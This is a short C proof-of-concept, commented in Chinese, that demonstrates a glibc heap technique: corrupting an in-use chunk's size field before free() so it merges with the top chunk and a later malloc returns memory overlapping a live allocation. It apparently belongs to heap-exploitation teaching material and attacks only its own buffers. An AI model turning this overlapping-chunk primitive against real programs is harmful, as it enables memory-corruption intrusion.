#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * glibc 2.23～2.43：在 free 之前改大 in-use chunk 的 size。
 *
 * p2 的真实大小是 0x500，后面紧邻大小 0x80 的 p3。把 p2.size 改为
 * 0x580 后，堆管理器计算出的 next 正好越过 p3 指向真实 top。free(p2)
 * 因而错误地把 p2 与 top 合并，后续 malloc 从 p2 起返回并覆盖 p3。
 */

int main(void)
{
    unsigned char *padding, *p2, *victim, *overlap;
    const size_t forged_chunk_size = 0x580;
    const size_t overlap_request = forged_chunk_size - 8;

    setbuf(stdout, NULL);

    /* padding 只保证 p2 前有正常 chunk；victim 后面直接是 top。 */
    padding = malloc(0x78);
    p2 = malloc(0x4f8);       /* 物理 size = 0x500 */
    victim = malloc(0x78);    /* 物理 size = 0x80 */
    assert(padding && p2 && victim);
    memset(victim, 'V', 0x70);

    assert((size_t)(victim - p2) == 0x500);

    /* 漏洞：p2 尚未释放时，由前向 overflow/OOB 覆盖其 size 字段。 */
    ((size_t *)p2)[-1] = forged_chunk_size | 1;

    /* 伪 next 是真实 top，free 会把“p2+p3”整体当成 top 前的空闲区。 */
    free(p2);

    overlap = malloc(overlap_request);
    assert(overlap == p2);
    assert(overlap < victim && overlap + overlap_request > victim);

    /* overlap 的 0x500 偏移就是 victim user data。 */
    memset(overlap + (victim - overlap), 'M', 0x20);
    assert(memcmp(victim, "MMMMMMMMMMMMMMMM", 16) == 0);

    puts("[+] overlap：在用块重叠成功");
    return 0;
}
